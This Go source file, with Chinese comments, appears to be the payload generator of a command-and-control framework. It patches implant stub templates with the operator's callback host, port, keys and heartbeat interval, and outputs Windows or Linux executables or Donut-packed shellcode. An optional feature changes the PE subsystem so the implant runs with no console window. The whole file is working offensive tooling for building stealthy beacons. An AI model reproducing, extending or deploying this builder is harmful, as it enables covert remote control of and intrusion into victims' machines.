package payload

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"c2/internal/c2embed"
	"c2/internal/renut"
)

type Generator struct {
	templatesDir string
	outputDir    string
}

func NewGenerator() *Generator {
	out := RelPathGenerated
	if d := strings.TrimSpace(os.Getenv("C2_GEN_PAYLOAD_OUT_DIR")); d != "" {
		out = d
	}
	return &Generator{
		templatesDir: "webdist/templates/payloads",
		outputDir:    out,
	}
}

type Config struct {
	ListenerID        uint
	Mode              string
	ServerAddr        string
	ExternalAddr      string
	// ListenAddr 监听器本机绑定地址（如 0.0.0.0:4444）；在 external 仅填 IP/主机名时用于补全端口。
	ListenAddr        string
	VKey              string
	Salt              string
	Arch              string
	OS                string
	Format            string
	Obfuscate         bool
	HeartbeatInterval int
	WebHost           string
	WebPort           int
	// HideConsole 为 true 时，对 Windows PE 将子系统从控制台(CUI)改为 GUI，运行时不弹出控制台窗口。
	HideConsole bool
}

// Generate 从 stubs 读取模板、修补 C2EMBED1，写入 data/generated。
// format=shellcode 且 Windows：在 Windows 上先修补 PE，再调用 renut/Donut -e3 生成壳代码。
// 在非 Windows 服务端：使用 go:embed 预置的 Donut -e1 壳代码（内嵌 PE 无明文加密），仅 PatchC2Embed 改 C2，不执行 Donut。
func (g *Generator) Generate(cfg *Config) (string, error) {
	if err := os.MkdirAll(g.outputDir, 0755); err != nil {
		return "", fmt.Errorf("创建输出目录: %w", err)
	}

	switch cfg.OS {
	case "windows_x64", "linux_amd64":
	default:
		return "", fmt.Errorf("unsupported OS: %s", cfg.OS)
	}

	switch cfg.Format {
	case "bin", "shellcode":
	default:
		return "", fmt.Errorf("格式仅支持 bin 或 shellcode，当前: %s", cfg.Format)
	}
	if cfg.OS == "linux_amd64" && cfg.Format == "shellcode" {
		return "", fmt.Errorf("Linux 仅支持可执行 ELF，请选择「可执行载荷」")
	}

	host, port, err := DialHostPortForAgent(cfg.ExternalAddr, cfg.ListenAddr)
	if err != nil {
		return "", err
	}
	if port < 1 || port > 65535 {
		return "", fmt.Errorf("TCP 端口无效: %d", port)
	}

	if cfg.HeartbeatInterval == 0 {
		cfg.HeartbeatInterval = 30
	}

	timestampNano := time.Now().UnixNano()
	var ext string
	switch cfg.Format {
	case "shellcode":
		ext = ".bin"
	default:
		if cfg.OS == "linux_amd64" {
			ext = ".elf"
		} else {
			ext = ".exe"
		}
	}
	osTag := cfg.OS
	if cfg.Format == "shellcode" {
		osTag = cfg.OS + "_sc"
	}
	filename := fmt.Sprintf("payload_%d_%s_%d%s", cfg.ListenerID, osTag, timestampNano, ext)
	outputPath := filepath.Join(g.outputDir, filename)

	raw, err := loadStubTemplate(cfg.OS, cfg.Format)
	if err != nil {
		return "", err
	}

	off := c2embed.FindPatchOffset(raw)
	wh, wp := cfg.WebHost, cfg.WebPort
	if strings.TrimSpace(wh) == "" {
		wh = "127.0.0.1"
	}
	if wp == 0 {
		wp = 8080
	}
	log.Printf("[payload] 修补前: C2EMBED1 在模板中的文件偏移=%d | 将写入 TCP=%s:%d Web=%s:%d 心跳=%ds | listener=%d os=%s format=%s",
		off, host, port, wh, wp, cfg.HeartbeatInterval, cfg.ListenerID, cfg.OS, cfg.Format)
	if off < 0 {
		log.Printf("[payload] WARN: 模板中未找到可修补的 C2EMBED1 块，后续 PatchC2Embed 将失败")
	}

	out, err := PatchC2Embed(raw, cfg, host, port)
	if err != nil {
		return "", fmt.Errorf("修补 C2EMBED1 失败（模板是否含魔数？）: %w", err)
	}
	winPE := cfg.OS == "windows_x64"
	usePremadeWinSC := winPE && cfg.Format == "shellcode" && runtime.GOOS != "windows"
	if cfg.HideConsole && winPE && !usePremadeWinSC {
		if err := patchPESubsystemWindowsGUI(out); err != nil {
			return "", fmt.Errorf("隐藏控制台(修改 PE 子系统): %w", err)
		}
	}
	if usePremadeWinSC && cfg.HideConsole {
		log.Printf("[payload] WARN: 非 Windows 服务端生成壳代码时无法修改内嵌 PE 子系统，仅通过 C2EMBED 标志写入「隐藏控制台」")
	}
	if pv, _, e2 := c2embed.ParseFirst(out); e2 != nil {
		log.Printf("[payload] WARN: 修补后回读解析失败: %v", e2)
	} else {
		log.Printf("[payload] 修补后校验(从二进制回读): TCP=%q port=%d | Web=%q port=%d | vkey_len=%d salt_len=%d hb=%d",
			pv.Host, pv.Port, pv.WebHost, pv.WebPort, len(pv.VKey), len(pv.Salt), pv.Heartbeat)
	}

	if cfg.Format == "shellcode" && winPE {
		if usePremadeWinSC {
			tmpl, err := loadPremadeWindowsShellcodeE1()
			if err != nil {
				return "", err
			}
			outSc, err := PatchC2Embed(tmpl, cfg, host, port)
			if err != nil {
				return "", fmt.Errorf("修补预置壳代码 C2EMBED: %w", err)
			}
			log.Printf("[payload] 非 Windows 服务端：使用预置 Donut -e1 壳代码模板并修补 C2 -> %s", outputPath)
			if pv, _, e2 := c2embed.ParseFirst(outSc); e2 != nil {
				log.Printf("[payload] WARN: 预置壳代码修补后回读解析失败: %v", e2)
			} else {
				log.Printf("[payload] 预置壳代码修补后校验: TCP=%q port=%d | Web=%q port=%d | hb=%d",
					pv.Host, pv.Port, pv.WebHost, pv.WebPort, pv.Heartbeat)
			}
			if err := ioutil.WriteFile(outputPath, outSc, 0644); err != nil {
				return "", fmt.Errorf("写入载荷: %w", err)
			}
		} else {
			log.Printf("[payload] renut: 调用 Donut (-e3) 生成壳代码 arch=%s -> %s", cfg.Arch, outputPath)
			if err := renut.PackPEBytes(out, cfg.Arch, outputPath); err != nil {
				return "", err
			}
		}
	} else {
		if err := ioutil.WriteFile(outputPath, out, 0755); err != nil {
			return "", fmt.Errorf("写入载荷: %w", err)
		}
	}
	log.Printf("[payload] 已写入 %s", outputPath)
	return filepath.Base(outputPath), nil
}

func (g *Generator) GetSupportedFormats() []string {
	return []string{"bin", "shellcode"}
}

func (g *Generator) GetSupportedOS() []string {
	return []string{"windows_x64", "linux_amd64"}
}

func (g *Generator) GetSupportedArch() []string {
	return []string{"amd64"}
}
